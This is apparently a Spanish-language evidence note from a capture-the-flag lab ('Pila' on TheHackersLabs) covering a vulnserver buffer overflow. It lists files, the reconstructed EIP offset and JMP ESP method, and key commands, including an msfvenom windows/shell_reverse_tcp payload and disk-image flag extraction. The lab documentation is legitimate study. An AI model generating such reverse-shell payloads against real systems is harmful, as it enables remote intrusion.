---
tags: [ctf, thehackerslabs, windows, evidencias]
tipo: evidencias
---

# Pila — Evidencias

> [!warning] Origen
> Basado en [[Pila]] y [[Pila - Roadmap]]. Los comandos se conservan; el detalle de salidas no literal se marca como reconstrucción.

## Originales

| # | Tipo | Descripción | Ruta | Origen |
|---|---|---|---|---|
| 1 | md | Nota principal de Pila | `01-CTF/TheHackersLabs/Pila/Pila.md` | sesión original |
| 2 | binario | `vulnserver.exe` / `vulnserver.c` / `essfunc.dll` | escritorio del Administrador (VM) | laboratorio |
| 3 | disco | `The Hackers Labs - Pila-disk001.vdi` (25 GB) | VirtualBox VMs | laboratorio |

## Reconstrucciones

| # | Qué | Base |
|---|---|---|
| 1 | Comandos vulnerables (`TRUN`, `GMON`) | `vulnserver.c` / análisis |
| 2 | Offset a EIP y `JMP ESP` | flujo del roadmap |

## Inferencias (no verificadas)

- El **offset exacto** y la dirección de `JMP ESP` no se conservan en la nota; se documenta el método, no los valores literales.

## Comandos clave reproducibles

```bash
nmap -sV -p9999 <IP>
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q <EIP>
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f c
fls -r -p pila.raw | grep -i -E 'user.txt|root.txt'
icat pila.raw <inode>
```

## Artefactos generados

| Artefacto | Ruta | Notas |
|---|---|---|
| payload BOF | local | script de exploit |
| `pila.raw` | local | imagen para extracción offline |
